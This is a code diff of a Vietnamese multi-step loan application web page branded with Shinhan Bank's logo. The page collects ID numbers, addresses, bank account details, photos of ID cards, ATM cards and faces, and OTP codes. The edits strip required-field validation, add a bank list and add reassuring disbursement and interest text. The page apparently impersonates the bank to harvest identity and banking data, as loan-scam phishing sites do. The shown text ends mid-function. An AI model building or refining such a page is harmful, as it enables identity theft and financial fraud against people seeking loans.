@@ -310,93 +310,140 @@
             </div>
             <h5 class="step-title">Thông Tin Đăng Ký</h5>
             <p class="step-description">Vui lòng điền đầy đủ thông tin để đăng ký vay tín chấp.</p>
-            <form id="registerForm" class="needs-validation" novalidate>
+            <form id="registerForm">
                 <div class="mb-3">
-                    <label for="fullName" class="form-label">Họ và Tên <span class="text-danger">*</span></label>
-                    <input type="text" class="form-control" id="fullName" placeholder="Nguyễn Văn A" required aria-describedby="fullNameFeedback">
-                    <div id="fullNameFeedback" class="invalid-feedback">Vui lòng nhập họ và tên.</div>
+                    <label for="fullName" class="form-label">Họ và Tên</label>
+                    <input type="text" class="form-control" id="fullName" placeholder="Nguyễn Văn A">
                 </div>
                 <div class="mb-3">
-                    <label for="idNumber" class="form-label">Số CMND/CCCD/Hộ Chiếu <span class="text-danger">*</span></label>
-                    <input type="text" class="form-control" id="idNumber" placeholder="123456789" required aria-describedby="idNumberFeedback">
-                    <div id="idNumberFeedback" class="invalid-feedback">Vui lòng nhập số CMND/CCCD/Hộ chiếu.</div>
+                    <label for="idNumber" class="form-label">Số CMND/CCCD/Hộ Chiếu</label>
+                    <input type="text" class="form-control" id="idNumber" placeholder="123456789">
                 </div>
                 <div class="mb-3">
-                    <label for="idIssueDate" class="form-label">Ngày Cấp CMND/CCCD <span class="text-danger">*</span></label>
-                    <input type="date" class="form-control" id="idIssueDate" required aria-describedby="idIssueDateFeedback">
-                    <div id="idIssueDateFeedback" class="invalid-feedback">Vui lòng chọn ngày cấp.</div>
+                    <label for="idIssueDate" class="form-label">Ngày Cấp CMND/CCCD</label>
+                    <input type="date" class="form-control" id="idIssueDate">
                 </div>
                 <div class="mb-3">
-                    <label for="idIssuePlace" class="form-label">Nơi Cấp CMND/CCCD <span class="text-danger">*</span></label>
-                    <input type="text" class="form-control" id="idIssuePlace" placeholder="Cục Cảnh sát DKQL cư trú" required aria-describedby="idIssuePlaceFeedback">
-                    <div id="idIssuePlaceFeedback" class="invalid-feedback">Vui lòng nhập nơi cấp.</div>
+                    <label for="idIssuePlace" class="form-label">Nơi Cấp CMND/CCCD</label>
+                    <input type="text" class="form-control" id="idIssuePlace" placeholder="Cục Cảnh sát DKQL cư trú">
                 </div>
                 <div class="mb-3">
-                    <label for="address" class="form-label">Địa Chỉ <span class="text-danger">*</span></label>
-                    <input type="text" class="form-control" id="address" placeholder="123 Đường Lê Lợi, Quận 1, TP.HCM" required aria-describedby="addressFeedback">
-                    <div id="addressFeedback" class="invalid-feedback">Vui lòng nhập địa chỉ.</div>
+                    <label for="address" class="form-label">Địa Chỉ</label>
+                    <input type="text" class="form-control" id="address" placeholder="123 Đường Lê Lợi, Quận 1, TP.HCM">
                 </div>
                 <div class="mb-3">
-                    <label for="occupation" class="form-label">Nghề Nghiệp <span class="text-danger">*</span></label>
-                    <input type="text" class="form-control" id="occupation" placeholder="Nhân viên văn phòng" required aria-describedby="occupationFeedback">
-                    <div id="occupationFeedback" class="invalid-feedback">Vui lòng nhập nghề nghiệp.</div>
+                    <label for="occupation" class="form-label">Nghề Nghiệp</label>
+                    <select class="form-select" id="occupation">
+                        <option value="" disabled selected>Chọn nghề nghiệp</option>
+                        <option value="Nhân viên văn phòng">Nhân viên văn phòng</option>
+                        <option value="Công nhân">Công nhân</option>
+                        <option value="Kinh doanh tự do">Kinh doanh tự do</option>
+                        <option value="Nội trợ">Nội trợ</option>
+                        <option value="Khác">Khác</option>
+                    </select>
                 </div>
                 <div class="mb-3">
-                    <label for="income" class="form-label">Thu Nhập Hàng Tháng (VND) <span class="text-danger">*</span></label>
-                    <input type="text" class="form-control" id="income" placeholder="10,000,000" required aria-describedby="incomeFeedback">
-                    <div id="incomeFeedback" class="invalid-feedback">Vui lòng nhập thu nhập hợp lệ.</div>
+                    <label for="income" class="form-label">Thu Nhập Hàng Tháng (VND)</label>
+                    <input type="text" class="form-control" id="income" placeholder="10,000,000">
                 </div>
                 <div class="mb-3">
-                    <label for="phoneNumber" class="form-label">Số Điện Thoại <span class="text-danger">*</span></label>
-                    <input type="tel" class="form-control" id="phoneNumber" placeholder="0901234567" required pattern="0[0-9]{9}" aria-describedby="phoneNumberFeedback">
-                    <div id="phoneNumberFeedback" class="invalid-feedback">Vui lòng nhập số điện thoại hợp lệ (10 số, bắt đầu bằng 0).</div>
+                    <label for="phoneNumber" class="form-label">Số Điện Thoại</label>
+                    <input type="tel" class="form-control" id="phoneNumber" placeholder="0901234567">
                 </div>
                 <div class="mb-3">
-                    <label for="email" class="form-label">Email <span class="text-danger">*</span></label>
-                    <input type="email" class="form-control" id="email" placeholder="example@domain.com" required aria-describedby="emailFeedback">
-                    <div id="emailFeedback" class="invalid-feedback">Vui lòng nhập email hợp lệ.</div>
+                    <label for="email" class="form-label">Email</label>
+                    <input type="email" class="form-control" id="email" placeholder="example@domain.com">
                 </div>
                 <div class="mb-3">
-                    <label for="loanAmount" class="form-label">Số Tiền Vay (VND) <span class="text-danger">*</span></label>
-                    <input type="text" class="form-control" id="loanAmount" placeholder="50,000,000" required aria-describedby="loanAmountFeedback">
-                    <div id="loanAmountFeedback" class="invalid-feedback">Vui lòng nhập số tiền vay hợp lệ.</div>
+                    <label for="loanAmount" class="form-label">Số Tiền Vay (VND)</label>
+                    <input type="text" class="form-control" id="loanAmount" placeholder="50,000,000">
                 </div>
                 <div class="mb-3">
-                    <label for="loanTerm" class="form-label">Kỳ Hạn Vay (Tháng) <span class="text-danger">*</span></label>
-                    <select class="form-select" id="loanTerm" required aria-describedby="loanTermFeedback">
+                    <label for="loanTerm" class="form-label">Kỳ Hạn Vay (Tháng)</label>
+                    <select class="form-select" id="loanTerm">
                         <option value="" disabled selected>Chọn kỳ hạn</option>
                         <option value="12">12 tháng</option>
                         <option value="24">24 tháng</option>
                         <option value="36">36 tháng</option>
+                        <option value="48">48 tháng</option>
+                        <option value="60">60 tháng</option>
                     </select>
-                    <div id="loanTermFeedback" class="invalid-feedback">Vui lòng chọn kỳ hạn vay.</div>
                 </div>
                 <div class="mb-3">
-                    <label for="loanPurpose" class="form-label">Mục Đích Vay <span class="text-danger">*</span></label>
-                    <select class="form-select" id="loanPurpose" required aria-describedby="loanPurposeFeedback">
+                    <label for="loanPurpose" class="form-label">Mục Đích Vay</label>
+                    <select class="form-select" id="loanPurpose">
                         <option value="" disabled selected>Chọn mục đích</option>
                         <option value="Sửa chữa nhà">Sửa chữa nhà</option>
                         <option value="Mua xe">Mua xe</option>
                         <option value="Học tập">Học tập</option>
                         <option value="Vay tiêu dùng">Vay tiêu dùng</option>
+                        <option value="Đầu tư kinh doanh">Đầu tư kinh doanh</option>
                         <option value="Khác">Khác</option>
                     </select>
-                    <div id="loanPurposeFeedback" class="invalid-feedback">Vui lòng chọn mục đích vay.</div>
                 </div>
                 <div class="mb-3">
-                    <label for="accountNumber" class="form-label">Số Tài Khoản Ngân Hàng <span class="text-danger">*</span></label>
-                    <input type="text" class="form-control" id="accountNumber" placeholder="1234567890" required aria-describedby="accountNumberFeedback">
-                    <div id="accountNumberFeedback" class="invalid-feedback">Vui lòng nhập số tài khoản ngân hàng.</div>
+                    <label for="accountNumber" class="form-label">Số Tài Khoản Ngân Hàng</label>
+                    <input type="text" class="form-control" id="accountNumber" placeholder="1234567890">
                 </div>
                 <div class="mb-3">
-                    <label for="bankName" class="form-label">Tên Ngân Hàng <span class="text-danger">*</span></label>
-                    <input type="text" class="form-control" id="bankName" placeholder="Shinhan Bank" required aria-describedby="bankNameFeedback">
-                    <div id="bankNameFeedback" class="invalid-feedback">Vui lòng nhập tên ngân hàng.</div>
+                    <label for="bankName" class="form-label">Tên Ngân Hàng</label>
+                    <select class="form-select" id="bankName">
+                        <option value="" disabled selected>Chọn ngân hàng</option>
+                        <option value="Agribank">Ngân hàng Nông nghiệp và Phát triển Nông thôn (Agribank)</option>
+                        <option value="Vietcombank">Ngân hàng Ngoại thương Việt Nam (Vietcombank)</option>
+                        <option value="VietinBank">Ngân hàng Công Thương Việt Nam (VietinBank)</option>
+                        <option value="BIDV">Ngân hàng Đầu tư và Phát triển Việt Nam (BIDV)</option>
+                        <option value="Techcombank">Ngân hàng Kỹ Thương Việt Nam (Techcombank)</option>
+                        <option value="MB Bank">Ngân hàng Quân đội (MB Bank)</option>
+                        <option value="VPBank">Ngân hàng Việt Nam Thịnh Vượng (VPBank)</option>
+                        <option value="Sacombank">Ngân hàng Sài Gòn Thương Tín (Sacombank)</option>
+                        <option value="ACB">Ngân hàng Á Châu (ACB)</option>
+                        <option value="HDBank">Ngân hàng Phát triển TP.HCM (HDBank)</option>
+                        <option value="TPBank">Ngân hàng Tiên Phong (TPBank)</option>
+                        <option value="VIB">Ngân hàng Quốc tế (VIB)</option>
+                        <option value="SHB">Ngân hàng Sài Gòn - Hà Nội (SHB)</option>
+                        <option value="Eximbank">Ngân hàng Xuất Nhập khẩu Việt Nam (Eximbank)</option>
+                        <option value="LienVietPostBank">Ngân hàng Bưu điện Liên Việt (LienVietPostBank)</option>
+                        <option value="MSB">Ngân hàng Hàng Hải (MSB)</option>
+                        <option value="OCB">Ngân hàng Phương Đông (OCB)</option>
+                        <option value="SeABank">Ngân hàng Đông Nam Á (SeABank)</option>
+                        <option value="Nam A Bank">Ngân hàng Nam Á (Nam A Bank)</option>
+                        <option value="Kienlongbank">Ngân hàng Kiên Long (Kienlongbank)</option>
+                        <option value="VietBank">Ngân hàng Việt Nam Thương Tín (VietBank)</option>
+                        <option value="BaoViet Bank">Ngân hàng Bảo Việt (BaoViet Bank)</option>
+                        <option value="PGBank">Ngân hàng Xăng dầu Petrolimex (PGBank)</option>
+                        <option value="Viet A Bank">Ngân hàng Việt Á (Viet A Bank)</option>
+                        <option value="NCB">Ngân hàng Quốc Dân (NCB)</option>
+                        <option value="ABBank">Ngân hàng An Bình (ABBank)</option>
+                        <option value="Bac A Bank">Ngân hàng Bắc Á (Bac A Bank)</option>
+                        <option value="Saigonbank">Ngân hàng Sài Gòn Công Thương (Saigonbank)</option>
+                        <option value="Viet Capital Bank">Ngân hàng Bản Việt (Viet Capital Bank)</option>
+                        <option value="Shinhan Bank">Ngân hàng Shinhan Việt Nam (Shinhan Bank)</option>
+                        <option value="HSBC">Ngân hàng HSBC Việt Nam</option>
+                        <option value="Standard Chartered">Ngân hàng Standard Chartered Việt Nam</option>
+                        <option value="Citibank">Ngân hàng Citibank Việt Nam</option>
+                        <option value="ANZ">Ngân hàng ANZ Việt Nam</option>
+                        <option value="UOB">Ngân hàng United Overseas Bank (UOB)</option>
+                        <option value="CIMB">Ngân hàng CIMB Việt Nam</option>
+                        <option value="Public Bank">Ngân hàng Public Bank Việt Nam</option>
+                        <option value="Hong Leong Bank">Ngân hàng Hong Leong Việt Nam</option>
+                        <option value="Woori Bank">Ngân hàng Woori Việt Nam</option>
+                        <option value="KEB Hana Bank">Ngân hàng KEB Hana Việt Nam</option>
+                        <option value="NongHyup Bank">Ngân hàng NongHyup Việt Nam</option>
+                        <option value="Khác">Khác</option>
+                    </select>
+                </div>
+                <div class="mb-3">
+                    <label for="creditHistory" class="form-label">Lịch Sử Tín Dụng</label>
+                    <select class="form-select" id="creditHistory">
+                        <option value="" disabled selected>Chọn trạng thái</option>
+                        <option value="Không có nợ xấu">Không có nợ xấu</option>
+                        <option value="Có nợ xấu">Có nợ xấu</option>
+                    </select>
                 </div>
                 <div class="mb-3 form-check">
-                    <input type="checkbox" class="form-check-input" id="termsAgree" required aria-describedby="termsAgreeFeedback">
+                    <input type="checkbox" class="form-check-input" id="termsAgree">
                     <label class="form-check-label" for="termsAgree">Tôi đồng ý với <a href="#" data-bs-toggle="modal" data-bs-target="#termsModal">điều khoản và điều kiện</a></label>
-                    <div id="termsAgreeFeedback" class="invalid-feedback">Vui lòng đồng ý với điều khoản.</div>
                 </div>
                 <div class="text-center">
                     <button type="submit" class="btn btn-primary" data-bs-toggle="tooltip" title="Tiếp tục sang bước tải lên giấy tờ">
@@ -418,13 +465,13 @@
                 <label for="idFrontImage" class="form-label">Hình Ảnh Mặt Trước CMND/CCCD <span class="text-danger">*</span></label>
                 <input type="file" class="form-control" id="idFrontImage" accept="image/jpeg,image/png" required aria-describedby="idFrontImageFeedback">
                 <div id="idFrontImageFeedback" class="invalid-feedback">Vui lòng tải lên hình ảnh mặt trước.</div>
-                <small id="idFrontInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB</small>
+                <small id="idFrontInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px</small>
             </div>
             <div class="mb-3">
                 <label for="idBackImage" class="form-label">Hình Ảnh Mặt Sau CMND/CCCD <span class="text-danger">*</span></label>
                 <input type="file" class="form-control" id="idBackImage" accept="image/jpeg,image/png" required aria-describedby="idBackImageFeedback">
                 <div id="idBackImageFeedback" class="invalid-feedback">Vui lòng tải lên hình ảnh mặt sau.</div>
-                <small id="idBackInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB</small>
+                <small id="idBackInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px</small>
             </div>
             <div class="text-center">
                 <button class="btn btn-back me-2" onclick="goBack(2, 1, 10)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa thông tin">Quay Lại</button>
@@ -446,7 +493,7 @@
                 <label for="atmImage" class="form-label">Hình Ảnh Thẻ ATM <span class="text-danger">*</span></label>
                 <input type="file" class="form-control" id="atmImage" accept="image/jpeg,image/png" required aria-describedby="atmImageFeedback">
                 <div id="atmImageFeedback" class="invalid-feedback">Vui lòng tải lên hình ảnh thẻ ATM.</div>
-                <small id="atmImageInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB</small>
+                <small id="atmImageInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px</small>
             </div>
             <div class="text-center">
                 <button class="btn btn-back me-2" onclick="goBack(3, 2, 20)" data-bs-toggle="tooltip" title="Quay lại để chỉnh sửa giấy tờ tùy thân">Quay Lại</button>
@@ -468,7 +515,7 @@
                 <label for="faceImage" class="form-label">Hình Ảnh Khuôn Mặt <span class="text-danger">*</span></label>
                 <input type="file" class="form-control" id="faceImage" accept="image/jpeg,image/png" required aria-describedby="faceImageFeedback">
                 <div id="faceImageFeedback" class="invalid-feedback">Vui lòng tải lên hình ảnh khuôn mặt.</div>
-                <small id="faceImageInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB</small>
+                <small id="faceImageInfo" class="form-text text-muted">Định dạng JPEG/PNG, tối đa 5MB, độ phân giải tối thiểu 300x300px</small>
             </div>
             <div class="preview-section">
                 <h6>Xem Trước Hình Ảnh</h6>
@@ -494,9 +541,10 @@
                 <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
             </div>
             <h5 class="step-title">Xác Minh OTP</h5>
-            <p class="step-description">Mã OTP đã được gửi đến số điện thoại của bạn.</p>
+            <p class="step-description">Mã OTP đã được gửi đến số điện thoại của bạn. Mã có hiệu lực trong 5 phút.</p>
             <div class="text-center mb-3">
                 <p>Mã OTP: <span id="otpDisplay">******</span> <button type="button" class="btn btn-link" onclick="copyOtp()">Sao chép</button></p>
+                <p><button type="button" class="btn btn-link" onclick="resendOtp()">Gửi lại OTP</button></p>
             </div>
             <div class="otp-container">
                 <input type="text" class="otp-digit form-control" id="otp1" maxlength="1" required>
@@ -531,8 +579,8 @@
                 <div id="step7ProfileImagePreview">
                     <p>Hình ảnh khuôn mặt: Chưa tải lên</p>
                 </div>
-                <div id="step7DisbursementCanvasContainer">
-                    <canvas id="step7DisbursementCanvas"></canvas>
+                <div id="step7ContractCanvasContainer">
+                    <canvas id="step7ContractCanvas"></canvas>
                 </div>
             </div>
             <div class="text-center">
@@ -550,7 +598,7 @@
                 <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
             </div>
             <h5 class="step-title">Xem Hợp Đồng</h5>
-            <p class="step-description">Vui lòng xem kỹ hợp đồng trước khi ký.</p>
+            <p class="step-description">Vui lòng xem kỹ hợp đồng trước khi ký. Hợp đồng bao gồm các điều khoản pháp lý và nghĩa vụ thanh toán.</p>
             <div class="canvas-container">
                 <canvas id="contractCanvas"></canvas>
             </div>
@@ -569,9 +617,10 @@
                 <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
             </div>
             <h5 class="step-title">Ký Hợp Đồng</h5>
-            <p class="step-description">Nhập mã OTP để xác nhận ký hợp đồng.</p>
+            <p class="step-description">Nhập mã OTP để xác nhận ký hợp đồng. Mã OTP có hiệu lực trong 5 phút.</p>
             <div class="text-center mb-3">
                 <p>Mã OTP: <span id="signOtpDisplay">******</span> <button type="button" class="btn btn-link" onclick="copySignOtp()">Sao chép</button></p>
+                <p><button type="button" class="btn btn-link" onclick="resendSignOtp()">Gửi lại OTP</button></p>
             </div>
             <div class="otp-container">
                 <input type="text" class="otp-digit form-control" id="signOtp1" maxlength="1" required>
@@ -596,7 +645,17 @@
                 <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
             </div>
             <h5 class="step-title">Điều Kiện Giải Ngân</h5>
-            <p class="step-description">Thông tin giải ngân của bạn.</p>
+            <p class="step-description">Vui lòng kiểm tra thông tin giải ngân và đảm bảo đáp ứng các điều kiện dưới đây.</p>
+            <div class="confirmation-box">
+                <h6>Điều Kiện Giải Ngân</h6>
+                <ul>
+                    <li>Hồ sơ vay đã được ký hợp đồng đầy đủ và hợp lệ.</li>
+                    <li>Tài khoản ngân hàng nhận giải ngân phải khớp với thông tin đăng ký.</li>
+                    <li>Không có thay đổi về tình trạng nợ xấu kể từ khi đăng ký.</li>
+                    <li>Thời gian giải ngân dự kiến: Trong vòng 1-3 ngày làm việc sau khi ký hợp đồng.</li>
+                </ul>
+                <p><strong>Lưu ý:</strong> Số tiền giải ngân sẽ được chuyển vào tài khoản: <span id="disbursementAccount"></span></p>
+            </div>
             <div class="canvas-container">
                 <canvas id="disbursementCanvas"></canvas>
             </div>
@@ -615,9 +674,10 @@
                 <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo" onerror="this.src='https://via.placeholder.com/150x50?text=Logo+Shinhan'">
             </div>
             <h5 class="step-title">Hoàn Tất</h5>
-            <p class="step-description">Đăng ký vay tín chấp của bạn đã hoàn tất! Chúng tôi sẽ liên hệ với bạn sớm nhất.</p>
+            <p class="step-description">Đăng ký vay tín chấp của bạn đã hoàn tất! Số tiền vay sẽ được giải ngân trong vòng 1-3 ngày làm việc.</p>
             <div class="text-center">
-                <img src="https://media.giphy.com/media/3o7TKtnb4wIvS0rQ4o/giphy.gif" alt="Congratulations" style="max-width: 200px;">
+                <img src="https://media.giphy.com/media/3o7TKtnb4wIvS0rQ4o/giphy.gif" alt="Congratulations" style="max-width: 200px;" onerror="this.src='https://via.placeholder.com/200x200?text=Hoan+Tat'">
+                <p class="mt-3">Cảm ơn bạn đã tin tưởng Shinhan Bank!</p>
             </div>
         </div>
 
@@ -636,11 +696,14 @@
                             <tr><td>Độ tuổi</td><td>20 - 60 tuổi</td></tr>
                             <tr><td>Thu nhập tối thiểu</td><td>8 triệu VND/tháng</td></tr>
                             <tr><td>Lịch sử tín dụng</td><td>Không có nợ xấu tại thời điểm đăng ký</td></tr>
+                            <tr><td>Kỳ hạn vay</td><td>12 - 60 tháng</td></tr>
                         </table>
                         <h6>2. Cam Kết Bảo Mật</h6>
                         <p>Chúng tôi cam kết bảo mật thông tin cá nhân của khách hàng theo quy định pháp luật Việt Nam.</p>
                         <h6>3. Trách Nhiệm Của Khách Hàng</h6>
-                        <p>Khách hàng chịu trách nhiệm cung cấp thông tin chính xác và đầy đủ. Mọi sai sót có thể ảnh hưởng đến quá trình duyệt hồ sơ.</p>
+                        <p>Khách hàng chịu trách nhiệm cung cấp thông tin chính xác và đầy đủ. Mọi sai sót có thể ảnh hưởng đến quá trình duyệt hồ sơ và giải ngân.</p>
+                        <h6>4. Phí và Lãi Suất</h6>
+                        <p>Lãi suất vay dao động từ 10% - 12%/năm, tùy thuộc vào số tiền vay. Có thể áp dụng phí phạt trả nợ trước hạn (2% - 5% số dư nợ).</p>
                     </div>
                     <div class="modal-footer">
                         <button type="button" class="btn btn-primary" data-bs-dismiss="modal">Đóng</button>
@@ -739,7 +802,7 @@
                     $('#profileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
                     $('#step7ProfileImagePreview').html('<p>Hình ảnh khuôn mặt: Chưa tải lên</p>');
                 }
-                if (userData.currentStep >= 8 && userData.contractImageUrl) {
+                if (userData.currentStep >= 7 && userData.contractImageUrl) {
                     $('#contractImagePreview').html(`<img src="${userData.contractImageUrl}" alt="Hình ảnh hợp đồng" />`);
                 } else {
                     $('#contractImagePreview').html('<p>Hình ảnh hợp đồng: Chưa có</p>');
@@ -757,11 +820,19 @@
                 console.log(`Chuyển từ bước ${currentStep} sang ${nextStep}`);
                 const $current = $(`#step${currentStep}`);
                 const $next = $(`#step${nextStep}`);
+                console.log('Current element:', $current.length ? 'Found' : 'Not found');
+                console.log('Next element:', $next.length ? 'Found' : 'Not found');
+                if (!$current.length || !$next.length) {
+                    throw new Error('One or both steps not found in DOM');
+                }
                 $current.css({ opacity: 0, transform: 'translateY(20px)' });
                 setTimeout(() => {
+                    console.log('Hiding current step:', currentStep);
                     $current.addClass('hidden');
+                    console.log('Showing next step:', nextStep);
                     $next.removeClass('hidden').css({ opacity: 0, transform: 'translateY(20px)' });
                     setTimeout(() => {
+                        console.log('Animating next step:', nextStep);
                         $next.css({ opacity: 1, transform: 'translateY(0)' });
                     }, 50);
                 }, 300);
@@ -771,11 +842,12 @@
                 saveToLocalStorage(nextStep);
                 updatePreviewSection();
                 if (nextStep === 7) {
-                    renderCanvas('step7DisbursementCanvas', formData.disbursementImage, userData);
+                    renderCanvas('step7ContractCanvas', formData.contractImage, userData);
                 } else if (nextStep === 8) {
                     renderCanvas('contractCanvas', formData.contractImage, userData);
                 } else if (nextStep === 9) {
                     renderCanvas('disbursementCanvas', formData.disbursementImage, userData);
+                    $('#disbursementAccount').text(`${userData.accountNumber || 'Không cung cấp'} (${userData.bankName || 'Không cung cấp'})`);
                 }
             } catch (error) {
                 console.error(`Lỗi chuyển từ bước ${currentStep} sang ${nextStep}:`, error);
@@ -795,7 +867,7 @@
         }
 
         function proceedToContract() {
-            proceedToStep(7, 8, 80);
+            proceedToStep(7, 8, 70);
         }
 
         window.onload = function() {
@@ -827,6 +899,7 @@
                         $('#loanPurpose').val(userData.loanPurpose || '');
                         $('#accountNumber').val(userData.accountNumber || '');
                         $('#bankName').val(userData.bankName || '');
+                        $('#creditHistory').val(userData.creditHistory || '');
                         $('#termsAgree').prop('checked', userData.termsAgree || false);
                         if (userData.currentStep) {
                             proceedToStep(1, userData.currentStep, userData.currentStep * 10);
@@ -834,11 +907,10 @@
                     }
                     updatePreviewSection();
                 }
-                // Khởi tạo tooltip
                 $('[data-bs-toggle="tooltip"]').tooltip();
-                // Khởi tạo input mask
-                $('#phoneNumber').mask('0000000000');
+                $('#phoneNumber').mask('0000000000#');
                 $('#accountNumber').mask('0000000000000000');
+                $('#idNumber').mask('000000000000');
             } catch (error) {
                 console.error("Lỗi khôi phục localStorage:", error);
                 showToast("Không thể khôi phục dữ liệu. Vui lòng bắt đầu lại.", false);
@@ -894,7 +966,7 @@
 
         function calculateInterestRate(loanAmount) {
             try {
-                const amount = parseInt(loanAmount);
+                const amount = parseInt(loanAmount) || 0;
                 if (amount <= 50000000) return "12%";
                 if (amount <= 200000000) return "11%";
                 return "10%";
@@ -907,9 +979,9 @@
         function calculateMonthlyPayment(loanAmount, loanTerm) {
             try {
                 const monthlyInterestRate = 0.01;
-                const totalInterest = loanAmount * monthlyInterestRate * loanTerm;
-                const totalAmount = parseInt(loanAmount) + totalInterest;
-                const monthlyPayment = totalAmount / loanTerm;
+                const totalInterest = (parseInt(loanAmount) || 0) * monthlyInterestRate * (parseInt(loanTerm) || 12);
+                const totalAmount = (parseInt(loanAmount) || 0) + totalInterest;
+                const monthlyPayment = totalAmount / (parseInt(loanTerm) || 12);
                 return Math.round(monthlyPayment).toLocaleString('vi-VN');
             } catch (error) {
                 console.error("Lỗi tính toán khoản góp:", error);
@@ -937,208 +1009,129 @@
                     showToast("Tệp ảnh không được vượt quá 5MB!", false);
                     return false;
                 }
-                // Kiểm tra độ phân giải
                 const img = new Image();
-                const resolutionCheck = new Promise((resolve) => {
-                    img.onload = () => {
+                return new Promise((resolve, reject) => {
+                    img.onload = function() {
                         if (img.width < minResolution || img.height < minResolution) {
                             $(`#${inputId}`).addClass('is-invalid');
                             showToast(`Ảnh phải có độ phân giải tối thiểu ${minResolution}x${minResolution}px!`, false);
                             resolve(false);
                         } else {
+                            $(`#${inputId}`).removeClass('is-invalid');
                             resolve(true);
                         }
                     };
+                    img.onerror = function() {
+                        $(`#${inputId}`).addClass('is-invalid');
+                        showToast("Lỗi tải ảnh. Vui lòng thử lại!", false);
+                        reject(new Error("Lỗi tải ảnh"));
+                    };
                     img.src = URL.createObjectURL(file);
                 });
-                return await resolutionCheck;
             } catch (error) {
-                console.error("Lỗi validate ảnh:", error);
-                showToast("Lỗi kiểm tra ảnh. Vui lòng thử lại!", false);
+                console.error(`Lỗi validate ảnh ${inputId}:`, error);
+                $(`#${inputId}`).addClass('is-invalid');
+                showToast("Lỗi xử lý ảnh. Vui lòng thử lại!", false);
                 return false;
             }
         }
 
         async function compressImage(file) {
             try {
-                const maxSize = 2 * 1024 * 1024; // 2MB
-                if (file.size <= maxSize) return file;
-                const img = new Image();
+                const maxSize = 5 * 1024 * 1024; // 5MB
+                const quality = 0.7; // Giảm chất lượng để giảm kích thước
                 const canvas = document.createElement('canvas');
                 const ctx = canvas.getContext('2d');
-                const compressed = await new Promise((resolve) => {
-                    img.onload = () => {
-                        canvas.width = img.width;
-                        canvas.height = img.height;
-                        ctx.drawImage(img, 0, 0);
-                        canvas.toBlob((blob) => {
-                            resolve(new File([blob], file.name, { type: 'image/jpeg', lastModified: Date.now() }));
-                        }, 'image/jpeg', 0.9);
-                    };
-                    img.src = URL.createObjectURL(file);
+                const img = new Image();
+                img.src = URL.createObjectURL(file);
+                await new Promise((resolve, reject) => {
+                    img.onload = resolve;
+                    img.onerror = () => reject(new Error("Lỗi tải ảnh để nén"));
                 });
-                return compressed;
+                canvas.width = img.width;
+                canvas.height = img.height;
+                ctx.drawImage(img, 0, 0);
+                const compressedDataUrl = canvas.toDataURL('image/jpeg', quality);
+                const compressedBlob = await (await fetch(compressedDataUrl)).blob();
+                const compressedFile = new File([compressedBlob], file.name, { type: 'image/jpeg' });
+                if (compressedFile.size > maxSize) {
+                    showToast("Ảnh nén vẫn vượt quá 5MB!", false);
+                    return null;
+                }
+                return compressedFile;
             } catch (error) {
                 console.error("Lỗi nén ảnh:", error);
-                return file;
+                showToast("Lỗi nén ảnh. Vui lòng thử lại!", false);
+                return null;
             }
         }
-
-        $('#idFrontImage').on('change', async function(e) {
-            try {
-                const file = e.target.files[0];
-                if (file && await validateImage(file, 'idFrontImage')) {
-                    const compressedFile = await compressImage(file);
-                    $('#idFrontInfo').text(`${compressedFile.name} (${Math.round(compressedFile.size / 1024)} KB)`);
-                }
-            } catch (error) {
-                console.error("Lỗi xử lý idFrontImage:", error);
-                showToast("Lỗi hiển thị thông tin ảnh. Vui lòng thử lại!", false);
-            }
-        });
-
-        $('#idBackImage').on('change', async function(e) {
-            try {
-                const file = e.target.files[0];
-                if (file && await validateImage(file, 'idBackImage')) {
-                    const compressedFile = await compressImage(file);
-                    $('#idBackInfo').text(`${compressedFile.name} (${Math.round(compressedFile.size / 1024)} KB)`);
-                }
-            } catch (error) {
-                console.error("Lỗi xử lý idBackImage:", error);
-                showToast("Lỗi hiển thị thông tin ảnh. Vui lòng thử lại!", false);
-            }
-        });
-
-        $('#atmImage').on('change', async function(e) {
-            try {
-                const file = e.target.files[0];
-                if (file && await validateImage(file, 'atmImage')) {
-                    const compressedFile = await compressImage(file);
-                    $('#atmImageInfo').text(`${compressedFile.name} (${Math.round(compressedFile.size / 1024)} KB)`);
-                }
-            } catch (error) {
-                console.error("Lỗi xử lý atmImage:", error);
-                showToast("Lỗi hiển thị thông tin ảnh. Vui lòng thử lại!", false);
-            }
-        });
-
-        $('#faceImage').on('change', async function(e) {
-            try {
-                const file = e.target.files[0];
-                if (file && await validateImage(file, 'faceImage')) {
-                    const compressedFile = await compressImage(file);
-                    $('#faceImageInfo').text(`${compressedFile.name} (${Math.round(compressedFile.size / 1024)} KB)`);
-                    const reader = new FileReader();
-                    reader.onload = function(e) {
-                        userData.faceImageUrl = e.target.result;
-                        updatePreviewSection();
-                        saveToLocalStorage(userData.currentStep || 4);
-                    };
-                    reader.readAsDataURL(compressedFile);
-                }
-            } catch (error) {
-                console.error("Lỗi xử lý faceImage:", error);
-                showToast("Lỗi hiển thị thông tin ảnh. Vui lòng thử lại!", false);
-            }
-        });
-
-        function generateLoanCode() {
-            try {
-                const date = new Date();
-                const year = date.getFullYear();
-                const month = String(date.getMonth() + 1).padStart(2, '0');
-                const day = String(date.getDate()).padStart(2, '0');
-                const random = Math.floor(100000 + Math.random() * 900000);
